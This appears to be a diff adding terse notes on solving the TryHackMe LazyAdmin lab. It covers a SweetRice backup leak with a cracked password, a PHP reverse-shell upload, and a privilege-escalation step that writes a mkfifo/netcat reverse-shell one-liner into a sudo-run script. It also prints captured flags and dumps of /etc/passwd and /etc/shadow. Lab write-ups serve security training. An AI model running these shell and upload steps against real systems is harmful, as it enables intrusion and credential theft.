@@ -1,0 +1,191 @@
+https://www.sevenlayers.com/index.php/354-tryhackme-lazyadmin-walkthrough
+https://jc01.ninja/ctf/lazy-admin/
+
+
+
+						nmap
+
+Apache server on port 80
+
+
+						gobuster
+
+/content
+
+found SweetRice install
+
+
+						explotation1
+
+SweetRice exploit1*
+
+SweetRice 1.5.1 - Backup Disclosure 
+
+You can access to all mysql backup and download them from this directory.
+http://localhost/inc/mysql_backup
+
+(http://10.10.201.160/content/inc/mysql_backup)
+
+found file*
+
+mysql_bakup_20191129023059-1.5.1.sql
+
+
+found login info*
+
+user: manager
+
+passwd: 42f749ade7f9e195bf475f37a44cafcb	md5	Password123
+
+
+login directory: /content/as
+
+
+						exploitation2
+
+SweetRice exploit2*
+
+upload point*
+
+http://10.10.15.47/content/as/?type=ad
+
+script location*
+rshell.php
+
+upload output*
+
+<script type="text/javascript" src="http://10.10.15.47/content/?action=ads&adname=hacked"></script>
+
+						(start nc listener)
+
+start rshell.php*
+
+10.10.15.47/content/inc/ads/hacked.php
+
+						(netcat)
+
+cd home
+
+cat user.txt
+THM{63e5bce9271952aad1113b6f1ac28a07}
+
+cat mysql_login.txt
+rice:randompass
+
+						privesc
+cd /etc/
+
+ls -lah | grep copy.sh
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.my.ip.yeah 4445 >/tmp/f" > copy.sh
+
+sudo /usr/bin/perl /home/itguy/backup.pl
+
+						(open an additional nc session)
+
+nc -lvnp 4445
+
+on nc session 1*
+
+sudo /usr/bin/perl /home/itguy/backup.pl
+
+on nc session2*
+
+cd root
+
+cat root.txt
+THM{6637f41d0177b6f37cb20d775124699f}
+
+						fun stuff
+
+# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:109:117::/nonexistent:/bin/false
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+saned:x:119:127::/var/lib/saned:/bin/false
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+itguy:x:1000:1000:THM-Chal,,,:/home/itguy:/bin/bash
+mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
+vboxadd:x:999:1::/var/run/vboxadd:/bin/false
+guest-3myc2b:x:998:998:Guest:/tmp/guest-3myc2b:/bin/bash
+sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
+
+# cat /etc/shadow
+root:!:18228:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:17954:0:99999:7:::
+uuidd:*:17954:0:99999:7:::
+lightdm:*:17954:0:99999:7:::
+whoopsie:*:17954:0:99999:7:::
+avahi-autoipd:*:17954:0:99999:7:::
+avahi:*:17954:0:99999:7:::
+dnsmasq:*:17954:0:99999:7:::
+colord:*:17954:0:99999:7:::
+speech-dispatcher:!:17954:0:99999:7:::
+hplip:*:17954:0:99999:7:::
+kernoops:*:17954:0:99999:7:::
+pulse:*:17954:0:99999:7:::
+rtkit:*:17954:0:99999:7:::
+saned:*:17954:0:99999:7:::
+usbmux:*:17954:0:99999:7:::
+itguy:$6$lEFmSzBi$M/BzAIH6sOmfmItrGxeLHdyrhb08KQyx8o0fDAytD2Xu9YKbZyYYqYXtnn0nnQrLRMed8GKJbvA.RwGM9HU3y0:18228:0:99999:7:::
+mysql:!:18229:0:99999:7:::
+vboxadd:!:18229::::::
+guest-3myc2b:!:18229::::::
+sshd:*:18229:0:99999:7:::
